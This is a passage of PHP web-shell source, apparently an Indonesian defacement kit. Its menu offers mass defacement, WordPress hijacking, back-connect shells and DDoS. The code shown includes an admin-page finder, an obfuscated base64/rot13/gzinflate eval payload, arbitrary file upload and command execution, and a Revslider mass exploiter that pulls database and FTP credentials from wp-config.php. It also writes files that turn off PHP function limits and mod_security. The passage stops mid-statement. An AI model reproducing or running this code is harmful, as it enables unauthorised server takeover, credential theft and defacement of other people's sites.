echo "<li><b><a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</b></a></li>";
echo "<li><b><a href='?dir=$dir&do=auto_dwp'>WordPress Auto Deface</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=auto_dwp2'>WordPress Auto Deface V.2</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=hijack_wp'>Wp Auto Hijack</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=cgi'>CGI Telnet</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=network'>Bypass CloudFlare 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=network'>All Bypas 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=passwbypass'>Bypass etc/passw</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=vhost'>Bypass vHost</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=defacerid'>Defacer.ID</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=zoneh'>Zone-H</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=dbdump'>DB Dump</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=string'>StringTools</a></b></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=network'>DD0S 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=network'>Tools 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=domains'>Domains Viewer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=csrfup'>Csrf Exploiter</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=hash'>Hash Generate</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=magen'>Magento DB Info</a></b></li>"; 
echo "<li><b><a href='?dir=$dir&do=code'>Inject Code</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=ngindexx'>NginDexer</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=whmcsdecod'>WHMCS Decoder</a></b><br></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=network'>WHOIS 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=hashid'>HashID</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=drupal'>Drupal MassExploiter</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=cmsvuln'>CMS Vulnerability Scanner</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=revslider'>Revslider MassExploiter</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=elfinder'>elFinderMass</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=loghunter'>Log Hunter</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=port'>Port Scaner</a><br></b></li>";
echo "<p>";
echo "<li><b><a href='?dir=$dir&do=network'>KDRP Shell 1</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=network'>Back Connect</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=backconnect'>Back Connect V.2</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=bypass'>Disable Functions</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=shellchk'>Shell Checker</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=shelscan'>Shell Finder</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=adfin'>admin finder</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=zip'>Zip Menu</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=about'>About</a></b></li>";
echo "<li><b><a href='?dir=$dir&do=metu'>LogOut</a></b></li>";
echo "</div>";
echo "<hr>";

if(isset($_GET['do']) && ($_GET['do'] == 'adfin'))
{   
set_time_limit(0);
error_reporting(0);
$list['front'] ="admin
adm
admincp
admcp
cp
modcp
moderatorcp
adminare
admins
cpanel
controlpanel";
$list['end'] = "admin1.php
admin1.html
admin2.php
admin2.html
yonetim.php
yonetim.html
yonetici.php
yonetici.html
ccms/
ccms/login.php
ccms/index.php
maintenance/
webmaster/
adm/
configuration/
configure/
websvn/
admin/
admin/account.php
admin/account.html
admin/index.php
admin/index.html
admin/login.php
admin/login.html
admin/home.php
admin/controlpanel.html
admin/controlpanel.php
admin.php
admin.html
admin/cp.php
admin/cp.html
cp.php
cp.html
administrator/
administrator/index.html
administrator/index.php
administrator/login.html
administrator/login.php
administrator/account.html
administrator/account.php
administrator.php
administrator.html
login.php
login.html
modelsearch/login.php
moderator.php
moderator.html
moderator/login.php
moderator/login.html
moderator/admin.php
moderator/admin.html
moderator/
account.php
account.html
controlpanel/
controlpanel.php
controlpanel.html
admincontrol.php
admincontrol.html
adminpanel.php
adminpanel.html
admin1.asp
admin2.asp
yonetim.asp
yonetici.asp
admin/account.asp
admin/index.asp
admin/login.asp
admin/home.asp
admin/controlpanel.asp
admin.asp
admin/cp.asp
cp.asp
administrator/index.asp
administrator/login.asp
administrator/account.asp
administrator.asp
login.asp
modelsearch/login.asp
moderator.asp
moderator/login.asp
moderator/admin.asp
account.asp
controlpanel.asp
admincontrol.asp
adminpanel.asp
fileadmin/
fileadmin.php
fileadmin.asp
fileadmin.html
administration/
administration.php
administration.html
sysadmin.php
sysadmin.html
phpmyadmin/
myadmin/
sysadmin.asp
sysadmin/
ur-admin.asp
ur-admin.php
ur-admin.html
ur-admin/
Server.php
Server.html
Server.asp
Server/
wp-admin/
administr8.php
administr8.html
administr8/
administr8.asp
webadmin/
webadmin.php
webadmin.asp
webadmin.html
administratie/
admins/
admins.php
admins.asp
admins.html
administrivia/
Database_Administration/
WebAdmin/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cPanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
members/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
admin_area/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
server/
database_administration/
power_user/
system_administration/
ss_vms_admin_sm/
adminarea/
bb-admin/
adminLogin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
admin/admin.php
admin_area/admin.php
admin_area/login.php
siteadmin/login.php
siteadmin/index.php
siteadmin/login.html
admin/admin.html
admin_area/index.php
bb-admin/index.php
bb-admin/login.php
bb-admin/admin.php
admin_area/login.html
admin_area/index.html
admincp/index.asp
admincp/login.asp
admincp/index.html
webadmin/index.html
webadmin/admin.html
webadmin/login.html
admin/admin_login.html
admin_login.html
panel-administracion/login.html
nsw/admin/login.php
webadmin/login.php
admin/admin_login.php
admin_login.php
admin_area/admin.html
pages/admin/admin-login.php
admin/admin-login.php
admin-login.php
admin.%EXT%
login.htm
login.html
login/
login.%EXT%
adm/
admin/
admin/account.html
admin/login.html
admin/login.htm
admin/home.%EXT%
admin/controlpanel.html
admin/controlpanel.htm
admin/cp.%EXT%
admin/adminLogin.html
admin/adminLogin.htm
admin/admin_login.%EXT%
admin/controlpanel.%EXT%
admin/admin-login.%EXT%
admin-login.%EXT%
admin/account.%EXT%
admin/admin.%EXT%
admin.htm
admin.html
adminitem/
adminitem.%EXT%
adminitems/
adminitems.%EXT%
administrator/
administrator/login.%EXT%
administrator.%EXT%
administration/
administration.%EXT%
adminLogin/
adminlogin.%EXT%
admin_area/admin.%EXT%
admin_area/
admin_area/login.%EXT%
manager/
manager.%EXT%
letmein/
letmein.%EXT%
superuser/
superuser.%EXT%
access/
access.%EXT%
sysadm/
sysadm.%EXT%
superman/
supervisor/
panel.%EXT%
control/
control.%EXT%
member/
member.%EXT%
members/
members.%EXT%
user/
user.%EXT%
cp/
uvpanel/
manage/
manage.%EXT%
management/
management.%EXT%
signin/
signin.%EXT%
log-in/
log-in.%EXT%
log_in/
log_in.%EXT%
sign_in/
sign_in.%EXT%
sign-in/
sign-in.%EXT%
users/
users.%EXT%
accounts/
accounts.%EXT%
wp-login.php
bb-admin/login.%EXT%
bb-admin/admin.%EXT%
bb-admin/admin.html
administrator/account.%EXT%
relogin.htm
relogin.html
check.%EXT%
relogin.%EXT%
blog/wp-login.%EXT%
user/admin.%EXT%
users/admin.%EXT%
registration/
processlogin.%EXT%
checklogin.%EXT%
checkuser.%EXT%
checkadmin.%EXT%
isadmin.%EXT%
authenticate.%EXT%
authentication.%EXT%
auth.%EXT%
authuser.%EXT%
authadmin.%EXT%
cp.%EXT%
modelsearch/login.%EXT%
moderator.%EXT%
moderator/
controlpanel/
controlpanel.%EXT%
admincontrol.%EXT%
adminpanel.%EXT%
fileadmin/
fileadmin.%EXT%
sysadmin.%EXT%
admin1.%EXT%
admin1.html
admin1.htm
admin2.%EXT%
admin2.html
yonetim.%EXT%
yonetim.html
yonetici.%EXT%
yonetici.html
phpmyadmin/
myadmin/
ur-admin.%EXT%
ur-admin/
Server.%EXT%
Server/
wp-admin/
administr8.%EXT%
administr8/
webadmin/
webadmin.%EXT%
administratie/
admins/
admins.%EXT%
administrivia/
Database_Administration/
useradmin/
sysadmins/
admin1/
system-administration/
administrators/
pgadmin/
directadmin/
staradmin/
ServerAdministrator/
SysAdmin/
administer/
LiveUser_Admin/
sys-admin/
typo3/
panel/
cpanel/
cpanel_file/
platz_login/
rcLogin/
blogindex/
formslogin/
autologin/
support_login/
meta_login/
manuallogin/
simpleLogin/
loginflat/
utility_login/
showlogin/
memlogin/
login-redirect/
sub-login/
wp-login/
login1/
dir-login/
login_db/
xlogin/
smblogin/
customer_login/
UserLogin/
login-us/
acct_login/
bigadmin/
project-admins/
phppgadmin/
pureadmin/
sql-admin/
radmind/
openvpnadmin/
wizmysqladmin/
vadmind/
ezsqliteadmin/
hpwebjetadmin/
newsadmin/
adminpro/
Lotus_Domino_Admin/
bbadmin/
vmailadmin/
Indy_admin/
ccp14admin/
irc-macadmin/
banneradmin/
sshadmin/
phpldapadmin/
macadmin/
administratoraccounts/
admin4_account/
admin4_colon/
radmind-1/
Super-Admin/
AdminTools/
cmsadmin/
SysAdmin2/
globes_admin/
cadmins/
phpSQLiteAdmin/
navSiteAdmin/
server_admin_small/
logo_sysadmin/
power_user/
system_administration/
ss_vms_admin_sm/
bb-admin/
panel-administracion/
instadmin/
memberadmin/
administratorlogin/
adm.%EXT%
admin_login.%EXT%
panel-administracion/login.%EXT%
pages/admin/admin-login.%EXT%
pages/admin/
acceso.%EXT%
admincp/login.%EXT%
admincp/
adminarea/
admincontrol/
affiliate.%EXT%
adm_auth.%EXT%
memberadmin.%EXT%
administratorlogin.%EXT%
modules/admin/
administrators.%EXT%
siteadmin/
siteadmin.%EXT%
adminsite/
kpanel/
vorod/
vorod.%EXT%
vorud/
vorud.%EXT%
adminpanel/
PSUser/
secure/
webmaster/
webmaster.%EXT%
autologin.%EXT%
userlogin.%EXT%
admin_area.%EXT%
cmsadmin.%EXT%
security/
usr/
root/
secret/
admin/login.%EXT%
admin/adminLogin.%EXT%
moderator.php
moderator.html
moderator/login.%EXT%
moderator/admin.%EXT%
yonetici.%EXT%
0admin/
0manager/
aadmin/
cgi-bin/login%EXT%
login1%EXT%
login_admin/
login_admin%EXT%
login_out/
login_out%EXT%
login_user%EXT%
loginerror/
loginok/
loginsave/
loginsuper/
loginsuper%EXT%
login%EXT%
logout/
logout%EXT%
secrets/
super1/
super1%EXT%
super_index%EXT%
super_login%EXT%
supermanager%EXT%
superman%EXT%
superuser%EXT%
supervise/
supervise/Login%EXT%
super%EXT%
bb-admin/index.html
bb-admin/login.html
bb-admin/admin.html
admin/home.html
pages/admin/admin-login.html
admin/admin-login.html
admin-login.html
admin/adminLogin.html
adminLogin.html
home.html
rcjakar/admin/login.php
adminarea/index.html
adminarea/admin.html
webadmin/index.php
webadmin/admin.php
user.html
modelsearch/login.html
adminarea/login.html
panel-administracion/index.html
panel-administracion/admin.html
modelsearch/index.html
modelsearch/admin.html
admincontrol/login.html
adm/index.html
adm.html
user.php
panel-administracion/login.php
wp-login.php
adminLogin.php
admin/adminLogin.php
home.php
adminarea/index.php
adminarea/admin.php
adminarea/login.php
panel-administracion/index.php
panel-administracion/admin.php
modelsearch/index.php
modelsearch/admin.php
admincontrol/login.php
adm/admloginuser.php
admloginuser.php
admin2/login.php
admin2/index.php
adm/index.php
adm.php
affiliate.php
adm_auth.php
memberadmin.php
administratorlogin.php
admin/admin.asp
admin_area/admin.asp
admin_area/login.asp
admin_area/index.asp
bb-admin/index.asp
bb-admin/login.asp
bb-admin/admin.asp
pages/admin/admin-login.asp
admin/admin-login.asp
admin-login.asp
user.asp
webadmin/index.asp
webadmin/admin.asp
webadmin/login.asp
admin/admin_login.asp
admin_login.asp
panel-administracion/login.asp
adminLogin.asp
admin/adminLogin.asp
home.asp
adminarea/index.asp
adminarea/admin.asp
adminarea/login.asp
panel-administracion/index.asp
panel-administracion/admin.asp
modelsearch/index.asp
modelsearch/admin.asp
admincontrol/login.asp
adm/admloginuser.asp
admloginuser.asp
admin2/login.asp
admin2/index.asp
adm/index.asp
adm.asp
affiliate.asp
adm_auth.asp
memberadmin.asp
administratorlogin.asp
siteadmin/login.asp
siteadmin/index.asp
ADMIN/
paneldecontrol/
wp-login.php/
login/
cms/
admon/
ADMON/
administrador/
ADMIN/login.php
panelc/
ADMIN/login.html";
function template() {
echo '

<script type="text/javascript">
<!--
function insertcode($text, $place, $replace)
{
    var $this = $text;
    var logbox = document.getElementById($place);
    if($replace == 0)
        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
    else
        document.getElementById($place).innerHTML = $this;
//document.getElementById("helpbox").innerHTML = $this;
}
-->
</script>
<br>
<br>
<h1 class="technique-two">
       


</h1>

<div class="wrapper">
<div class="red">
<div class="tube">
<center><table class="tabnet"><th colspan="2">Admin Finder</th><tr><td>
<form action="" method="post" name="xploit_form">

<tr>
<tr>
    <b><td>URL</td>
    <td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
    </td>
</tr><tr>
    <td>404 string</td>
    <td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
    </td></b>
</tr><br><td>
<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
</span></td></tr>
</form></td></tr>
<br /></table>
</div> <!-- /tube -->
</div> <!-- /red -->
<br />
<div class="green">
<div class="tube" id="rightcol">
Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
<b>Found ones:<br /></b>
</div> <!-- /tube -->
</div></center><!-- /green -->
<br clear="all" /><br />
<div class="blue">
<div class="tube" id="logbox">
<br />
<br />
Admin page Finder :<br /><br />
</div> <!-- /tube -->
</div> <!-- /blue -->
</div> <!-- /wrapper -->
<br clear="all"><br>';
}
function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
    if($br == 1) $msg .= "<br />";
    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
    if($stop == 1) exit;
    @flush();@ob_flush();
}
function check($x, $front=0) {
    global $_POST,$site,$false;
    if($front == 0) $t = $site.$x;
    else $t = 'http://'.$x.'.'.$site.'/';
    $headers = get_headers($t);
    if (!eregi('200', $headers[0])) return 0;
    $data = @file_get_contents($t);
    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
    return 1;
}
   
// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
template();
if(!isset($_POST['xploit_url'])) die;
if($_POST['xploit_url'] == '') die;
$site = $_POST['xploit_url'];
if ($site[strlen($site)-1] != "/") $site .= "/";
if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
$list['end'] = str_replace("\r", "", $list['end']);
$list['front'] = str_replace("\r", "", $list['front']);
$pathes = explode("\n", $list['end']);
$frontpathes = explode("\n", $list['front']);
show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
$verificate = 0;
foreach($pathes as $path) {
    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
    }
}
preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
if(substr($site, 0, 3) == "www") $site = substr($site, 4);
foreach($frontpathes as $frontpath) {
    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
    $verificate++; show($verificate, 0, 0, 'verified', 1);
    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
    else{
        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
    }
   
}
}
 elseif($_GET['do'] == 'hijack_wp')
    {
$gwtamvan="nUl6QuM4EP58VfyHOR9FipY2KYVdrjTZ5Wvb1b0hXrQfSahlErfxkcTBaSjllv9+4zha0+Vgj4tH1RnPyzMzz9iBDzzncMVnxxGlLlc9DsvJhFaeQp0t8Db319feB+t4gM91InEGNNJc5D4BAhnTiYh9RQilCSr9MApyQ/0ilnhz1gEa5RoUf2D+QfCm2/W/wHQh408ypeBGHrN7+Mj/otENnFZ+twfXfrf7c+Qaq2Dkor3b+LI/E+Z9kRQWE4sSAXF9epQwGuPeKOX5DVWW+g6PUe6AnhcM1xmdMhclDiSSWnwn0boYumHI8nweVpoVTeS9VXHurOiincaYYUykgsbK3fb6A9fbZHQL3L0Ci+OadUhS6jI4dH9eXDpTqrlBTLBZ86DUos5l5Npa1GUXkJWeShLN7jWVjMLf63h1hyUb5iJ02IFVpE8O4af+z+9pQkEAJSE6dGXYL+5OiZTHQve6KZvoIez8m8bj+hrPsdcm0qrvSNex0Jqh5WBja0vtPRrcFi/ZYmjATKkEMZUwhEvhgip1DpWtQll7u0iGA6+434fqfU8zns6HJ5JufB7dQ9AJg0asiN4HC7NTVoKXOIQIMdQqZhBYATTlRnGuFZMAQ8izKSgZ+aQmxHk2G/S8hwevIgNpfsf19vDf7e+6Yvu7u97bwe6e6T8BFyMU3yZMsb3C6pMFS8t+slpgTyNcCIkDUYJQEXB6f5nD77SUXNOcRjjQGtNg0vg8dESlEc7hnOfIoIPzcy5JM1u82Z5JjCeGWQTudU3iWCoimiZzVyGnGQqKdkXP7PNTMdU0pIqNjcnCMA7zLH/ZDtsy4fdaJPv2olKpmDTa4zhcximVxOc7oahFcypbhsUsjsMQIT5KpHPKohStfW/WjbGY5cS0D+V9zyMgxQyX79AbRZuCIVaX3Zb8zieYF/IvMerVZOETYv/q/De/JhJP0yzk9kORZ+ZtD0osm96cGXELDK1QeiVWSIYZYppIFttaxjXPK9ITeO4uuSezwKnHZcO2GHzYGJtk/OJLgWa9Q6hN2dqv3tvbtgMrGkm0R6qr3Y5vJVgVXs2nj5MvbKGw5glGnVMbC+5cYjbuKrK0vUiCxpnrLkjIrBgvziA+gcYlSQs9mpMN6udQNkq36Rj7lLNVaurKeS1G3HcS2QQhIeascFqYlE9pNhf4Tc4UWNEX8q5w6/h9ww2cppT9gR01+dV29KC6PBV2K0nw+qhyfd2WWc475Ors6ODyuO3m4vgSjPW4ukXAagj6q+uNjh34/PH4/Bg+HU4AHpA2GEawH+tAK7VNAth+BYBtBF4F4RFLqksLyPYzQAavAJJK5X0NiuWyc1YqFOt8W6tSQr5+eqrTLAdCY9uPkubEKZbfTvZzY/CGZoKL8lMxBb+yxeVoivfj8Kg544vV7x/ypGn/L+wpndLUxOr14AIPa3bjaf5GXLvEv38A";
eval(gzinflate(str_rot13(base64_decode($gwtamvan)))); 

} 
 elseif($_GET['do'] == 'upload') {
    echo "<center>";
    if($_POST['upload']) {
        if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
            $act = "<font color=#FDF105>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
        } else {
            $act = "<font color=red>failed to upload file</font>";
        }
    }
    echo "Upload File: [ ".w($dir,"Writeable")." ]<form method='post' enctype='multipart/form-data'><input type='file' name='ix_file'><input type='submit' value='upload' name='upload'></form>";
    echo $act;
    echo "</center>";
} 
elseif($_GET['do'] == 'domains'){
    echo "<center><div class='mybox'><p align='center' class='cgx2'>Domains and Users</p>";
    $d0mains = @file("/etc/named.conf");
    if(!$d0mains){
        die("<center>Error : can't read [ /etc/named.conf ]</center>");
        }
        echo '<table id="output"><tr bgcolor=#cecece><td>Domains</td><td>users</td></tr>';
        foreach($d0mains as $d0main){if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);flush();if(strlen(trim($domains[1][0])) > 2){$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));echo "<tr><td><a href=http://www.".$domains[1][0]."/>".$domains[1][0]."</a></td><td>".$user['name']."</td></tr>";flush();}}}echo'</div></center>';
}
 elseif($_GET['do'] == 'cmd') {
    echo "<form method='post'>
    <font style='text-decoration: underline;'>".$user."@".gethostbyname($_SERVER['HTTP_HOST']).":~# </font>
    <input type='text' size='30' height='10' name='cmd'><input type='submit' name='do_cmd' value='>>'>
    </form>";
    if($_POST['do_cmd']) {
        echo "<pre>".exe($_POST['cmd'])."</pre>";
    }
}
elseif ($_GET['do'] == revslider) {
        echo "
<center class='mybox'>
<h1>Revslider Mass Exploiter</h1>
<form method='post'>
<textarea class='mybox' name='site' cols='50' rows='12'>
http://site.com
http://site2.com
http://site3.com</textarea><br>
<input class='kotak' type='submit' style='width: 50px; height: 30px; border-color:white;margin:10px 2px 0 2px;' name='sikat' value='SIKAT!'>
</form></center>
";
        function findit($mytext, $starttag, $endtag) {
            $posLeft = stripos($mytext, $starttag) + strlen($starttag);
            $posRight = stripos($mytext, $endtag, $posLeft + 1);
            return substr($mytext, $posLeft, $posRight - $posLeft);
        }
        error_reporting(0);
        set_time_limit(0);
        $ya = $_POST['sikat'];
        $co = $_POST['site'];
        if ($ya) {
            $e = explode("
", $co);
            foreach ($e as $bda) {
                //echo '<br>'.$bda;
                $linkof = '/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php';
                $dn = ($bda) . ($linkof);
                $file = @file_get_contents($dn);
                if (eregi('DB_HOST', $file) and !eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='#FDF105' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=#FDF105 >DB name : </font>" . findit($file, "DB_NAME', '", "');") . "<br>";
                    echo "<font face='courier' color=#FDF105 >DB user : </font>" . findit($file, "DB_USER', '", "');") . "<br>";
                    echo "<font face='courier' color=#FDF105 >DB pass : </font>" . findit($file, "DB_PASSWORD', '", "');") . "<br>";
                    echo "<font face='courier' color=#FDF105 >DB host : </font>" . findit($file, "DB_HOST', '", "');") . "<br>";
                } elseif (eregi('DB_HOST', $file) and eregi('FTP_USER', $file)) {
                    echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
                    echo "<center><font face='courier' color='#FDF105' >" . $bda . "</font></center>";
                    echo "<font face='courier' color=#FDF105 >FTP user : </font>" . findit($file, "FTP_USER','", "');") . "<br>";
                    echo "<font face='courier' color=#FDF105 >FTP pass : </font>" . findit($file, "FTP_PASS','", "');") . "<br>";
                    echo "<font face='courier' color=#FDF105 >FTP host : </font>" . findit($file, "FTP_HOST','", "');") . "<br>";
                } else {
                    echo "<center><font face='courier' color='red' >" . $bda . " ----> not infected </font></center>";
                }
                echo '<center><font face="courier" color=white >----------------------------------------------</font></center>';
            }
        }

}
elseif($_GET['do'] == 'bypass'){
        echo "<center>";
        echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
        if(isset($_POST['ini']))
{
        $file = fopen("php.ini","w");
        echo fwrite($file,"disable_functions=none
safe_mode = Off
    ");
        fclose($file);
        echo "<a href='php.ini'>click here!</a>";
}       if(isset($_POST['htce']))
{
        $file = fopen(".htaccess","w");
        echo fwrite($file,"<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
</IfModule>
    ");
        fclose($file);
        echo "htaccess successfully created!";
}
        echo"</center>";
}
elseif ($_GET['do'] == cmsvuln) {
        @set_time_limit(0);
        @error_reporting(0);
        // Script Functions , start ..!
        function ask_exploit_db($component) {
            $exploitdb = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
            $result = @file_get_contents($exploitdb);
            if (eregi("No results", $result)) {
                echo "<center><td>Gak ada</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
            } else {
                echo "<td><a href='$exploitdb'>Klik Ini..!</a></td><td><--</td></tr>";
            }
        }
        /**************************************************************/
        /* Joomla Conf */
        function get_components($site) {
            $source = @file_get_contents($site);
            preg_match_all('{option,(.*?)/}i', $source, $f);
            preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
            preg_match_all('{/components/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~] Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $comm) {
                echo "<tr><td>$comm</td>";
                ask_exploit_db($comm);
            }
        }
        /**************************************************************/
        /* WP Conf */
        function get_plugins($site) {
            $source = @file_get_contents($site);
            preg_match_all("#/plugins/(.*?)/#i", $source, $f);
            $plugins = array_unique($f[1]);
            if (count($plugins) == 0) {
                echo "<tr><td style='border-color:white' colspan=1>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach ($plugins as $plugin) {
                echo "<tr><td>$plugin</td>";
                ask_exploit_db($plugin);
            }
        }
        /**************************************************************/
        /* Nuke's Conf */
        function get_numod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{?name=(.*?)/}i', $source, $f);
            preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i', $source, $f2);
            preg_match_all('{/modules/(.*?)/}i', $source, $f3);
            $arz = array_merge($f2[1], $f[1], $f3[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $nmod) {
                echo "<tr><td>$nmod</td>";
                ask_exploit_db($nmod);
            }
        }
        /*****************************************************/
        /* Xoops Conf */
        function get_xoomod($site) {
            $source = @file_get_contents($site);
            preg_match_all('{/modules/(.*?)/}i', $source, $f);
            $arz = array_merge($f[1]);
            $coms = array();
            if (count($arz) == 0) {
                echo "<tr><td style='border-color:white' colspan=3>[~]  Gak ada ! Keknya Site Error atau Option salah :-</td></tr>";
            }
            foreach (array_unique($arz) as $x) {
                $coms[] = $x;
            }
            foreach ($coms as $xmod) {
                echo "<tr><td>$xmod</td>";
                ask_exploit_db($xmod);
            }
        }
        /**************************************************************/
        /* Header */
        function t_header($site) {
            echo '<br><hr color="white"><br><table align="center" border="1" style="border-color=white; text-align:left;" width="50%" cellspacing="1" cellpadding="5">';
            echo '
<tr>
<td style="border-color=white">Site : <a href="' . $site . '">' . $site . '</a></td>
<td style="border-color=white">Exploit-db</b></td>
<td style="border-color=white">Exploit it !</td>
</tr>
';
        }
        echo '<div class="mybox" style="text-align:left">
<h1>CMS Vulnerability Scanner</h1><hr color="white">
<form method="POST" action=""  class="header-izz">
    <p>Link&nbsp&nbsp<input type="text" style="border:0;border-bottom:1px solid #292929; width:500px;" name="site" value="http://127.0.0.1/" >
    <br><br>
    CMS
    &nbsp&nbsp&nbsp<select  name="pilihan" style="border:0;border-bottom:1px solid #292929; width:500px;">
    <option>Wordpress</option>
    <option>Joomla</option>
    <option>Nukes</option>
    <option>Xoops</option> 
    </select><br><br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type="submit" style="width: 50px; height: 30px; border-color=white;margin:10px 2px 0 2px;" value="Sikat" class="kotak"></p>
</form>';
        // Start Scan :P :P ...
        if ($_POST) {
            $site = strip_tags(trim($_POST['site']));
            t_header($site);
            echo $x01 = ($_POST['pilihan'] == "Wordpress") ? get_plugins($site) : "";
            echo $x02 = ($_POST['pilihan'] == "Joomla") ? get_components($site) : "";
            echo $x03 = ($_POST['pilihan'] == "Nuke's") ? get_numod($site) : "";
            echo $x04 = ($_POST['pilihan'] == "Xoops") ? get_xoomod($site) : "";
        }

}
elseif($_GET['do'] == 'network') {
    echo "<center><form method='post'>
    Back Connect: <br>
